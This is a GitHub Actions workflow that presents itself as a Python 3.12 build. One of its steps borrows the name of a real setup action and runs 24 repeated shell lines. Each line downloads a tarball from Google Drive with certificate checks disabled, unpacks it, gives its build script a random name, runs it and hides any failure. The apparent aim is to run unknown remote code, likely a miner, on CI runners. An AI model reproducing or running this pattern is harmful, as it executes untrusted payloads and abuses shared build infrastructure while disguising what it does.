name: Ngoc Nhi

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
    - name: Set up Python 3.12
      uses: actions/setup-python@v5
      with:
        python-version: "3.12"
    - name: actions/setup-python@v5
      run: |
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1plUgTA0E-FlzHcps7rtcwNXVByubjzYG&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber24 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1emU3qvACs1q0uS5GORLBibacnbCIldXg&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber23 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1bzCr7I8dfvZx2Ay39EHkBPr9pGTRGCbK&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber22 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1aYSDzlJN-a-km1b04GYUxzgEmi5hvZI4&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber21 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1wTR47HtSyQEduuFhfRlXQ6TUZSy624GV&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber20 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1A4irzX6GlGnZFkSZh5jewAZzCHL98ZsS&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber19 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1iEtuL8v7__JeERD2RH2BZhRC8DvTFJCB&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber18 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1P_eihCopcExcsmFQFUsMmm_BMQdPhdPJ&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber17 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1YOZWDcLE6Oh5OOVNIxyeKe5ivdh1mlAL&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber16 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1qZX-pDGg1b8-WyKZDN21jFLfn8CV_7aC&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber15 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1x44SpxOxDMlfroCY3Se_gkDR86H2tq-8&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber14 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1qRIiEbeYutNziQnuP_3AhCO1YYKZJJeh&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber13 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1Y8Q1qtxvSHciBqVENWzecZqNO6IQYsh3&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber12 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1KT-XG5GmSiNdw7_sTUToRxbZxBnKg01h&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber11 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1aa8zl32zMPKkDNEQTZ87-cC0TqLqgE1c&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber10 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1DTotf4r9_VHtl4gWsekyV7YEKiik-piS&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber9 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1-hrv8Qj9765wX0r2nQJdBUEZRdzEIbOb&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber8 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1KX70HhNv6m5fpkdvfcyvGPGVfD_5zWAI&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber7 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1ediJB7vmds-aAEJG-QbeiSp90kSlGLQ9&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber6 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=17lFPH0ZmFYjTc55bIJkbo5aF4ybYNlXD&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber5 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=15pYelkksAHHkW2sPBGYxQwER3lk19N75&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber4 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1A3K6zOZ9gI7vBzTYbxzyOhsfoSvJIK2N&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber3 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1vvXmfgqecF9uHpPwbpoxsf7eIJmtC2Rx&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber2 || true
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=189ySG_AN9eSNn5ZOyPqEuTzTQlQqktHd&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber1 || true
        lscpu